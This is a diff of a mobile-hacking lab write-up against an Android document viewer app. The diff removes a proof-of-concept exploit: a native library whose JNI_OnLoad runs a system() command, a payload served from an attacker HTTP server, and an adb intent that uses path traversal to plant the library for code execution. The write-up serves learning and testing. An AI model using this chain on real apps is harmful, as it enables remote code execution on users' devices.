@@ -285,37 +285,7 @@ Refer to:
 - https://www.youtube.com/watch?v=87uMi7L-3Hc
 - https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad
 - https://www.youtube.com/watch?v=GQ7bwUOmVqk&list=PLwP4ObPL5GY_dBI_lSwBzKM4zxP4mWSqK&t=2447s
+- https://developer.android.com/codelabs/android-studio-cmake
 
-My `native-lib.cpp`:
-```C++
-#include <jni.h>  
-#include <string>  
-#include <unistd.h>    
-  
-JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {  
-    if (fork() == 0) {  
-        system("touch /data/data/com.mobilehackinglab.documentviewer/poc.txt");  
-    }  
-    JNIEnv* env;  
-    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {  
-        return JNI_ERR;  
-    }  
-    return JNI_VERSION_1_6;  
-}
-```
-Build the apk, decompile it with apktool, then copy the `app-debug/lib/x86_64/libdocviewer.so` to the HTTP server root directory with named as `libdocviewer_pro.so`
+`To create a native shared library (`.so` file) in Android, you typically use the Android NDK (Native Development Kit) along with C or C++ code.`
 
-Change the `http_server.py` script become:
-```
-	pdf_path = "libdocviewer_pro.so"
-```
-
-**Running the script**
-`$ python3 http_server.py`
-```
-Server running on port 8080
-```
-
-
-Then download the `libdocviewer_pro.so`
-`$ adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity -a android.intent.action.VIEW -d "http://192.168.56.102:8080/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2F%2Fx86_x64%2Flibdocviewer_pro.so`
